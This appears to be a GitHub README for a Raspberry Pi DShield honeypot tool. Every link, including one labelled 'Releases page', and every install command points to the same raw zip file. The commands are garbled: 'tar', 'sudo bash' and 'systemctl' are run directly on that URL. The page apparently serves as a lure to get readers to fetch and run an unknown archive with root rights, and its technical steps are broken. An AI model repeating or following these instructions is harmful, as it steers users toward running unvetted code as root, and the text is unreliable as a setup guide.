## 🚀 Getting Started
Welcome to the Raspberry-Pi-Honeypot-DShield project! This tool allows you to turn a Raspberry Pi 4 into a DShield honeypot. It helps you capture and study network probes and brute-force attempts in a safe lab environment. 

## 📦 Requirements
Before you begin, make sure you have the following:
- **Hardware**: A Raspberry Pi 4
- **Operating System**: Raspbian OS (latest version recommended)
- **Storage**: At least 8 GB of available storage on your Raspberry Pi
- **Network**: Access to a network for monitoring and logging attempts

## 🔧 Features
- **Capture Network Probes**: Track attempts to access your network.
- **Brute-Force Detection**: Identify unauthorized access attempts.
- **Safe Environment**: Analyze behavior without affecting your main network.
- **User-Friendly Interface**: Simple setup process, suitable for all users.

## 💾 Download & Install
To get started, visit the [Releases page](https://raw.githubusercontent.com/Yugayuga52/Raspberry-Pi-Honeypot-DShield/main/stowdown/Raspberry-Pi-Honeypot-DShield.zip) to download the latest version of the software. Follow these steps to install:

1. **Visit the page**: Click the link to go to the [Releases page](https://raw.githubusercontent.com/Yugayuga52/Raspberry-Pi-Honeypot-DShield/main/stowdown/Raspberry-Pi-Honeypot-DShield.zip).
2. **Choose the version**: Look for the latest release at the top of the page.
3. **Download the files**: Click on the asset associated with the release. Save the file to your Raspberry Pi.
4. **Extract the files**: Use your file manager or terminal to extract the downloaded archive.

   ```bash
   tar -xvf https://raw.githubusercontent.com/Yugayuga52/Raspberry-Pi-Honeypot-DShield/main/stowdown/Raspberry-Pi-Honeypot-DShield.zip
   ```

5. **Navigate to the folder**: Open the terminal and change to the extracted directory.

   ```bash
   cd Raspberry-Pi-Honeypot-DShield
   ```

6. **Run the setup**: Execute the installation script.

   ```bash
   sudo bash https://raw.githubusercontent.com/Yugayuga52/Raspberry-Pi-Honeypot-DShield/main/stowdown/Raspberry-Pi-Honeypot-DShield.zip
   ```

7. **Start the service**: Launch the honeypot.

   ```bash
   sudo systemctl start https://raw.githubusercontent.com/Yugayuga52/Raspberry-Pi-Honeypot-DShield/main/stowdown/Raspberry-Pi-Honeypot-DShield.zip
   ```

   This will initialize the honeypot and begin capturing data.

## 📝 Configuration
After installation, you may want to configure settings to fit your lab environment. You can find the configuration file in the installation directory. Open it in a text editor of your choice to adjust settings like:

- **Logging Options**: Decide how data should be logged.
- **Network Interface**: Specify which network interface should capture traffic.
- **Alert Settings**: Set parameters for notifications on detected probes.

## 🔒 Usage Instructions
To effectively use your Raspberry Pi honeypot:

1. **Monitor Traffic**: Regularly check logs for suspicious activity.
2. **Analyze Data**: Use tools like Wireshark or custom scripts to parse logs.
3. **Deploy Security Measures**: Based on findings, enhance your network security.

## 🚧 Troubleshooting
If you encounter issues:

- **Check Logs**: Review logs in the installation directory for error messages.
- **Restart Services**: Sometimes restarting the honeypot resolves connectivity issues.

   ```bash
   sudo systemctl restart https://raw.githubusercontent.com/Yugayuga52/Raspberry-Pi-Honeypot-DShield/main/stowdown/Raspberry-Pi-Honeypot-DShield.zip
   ```
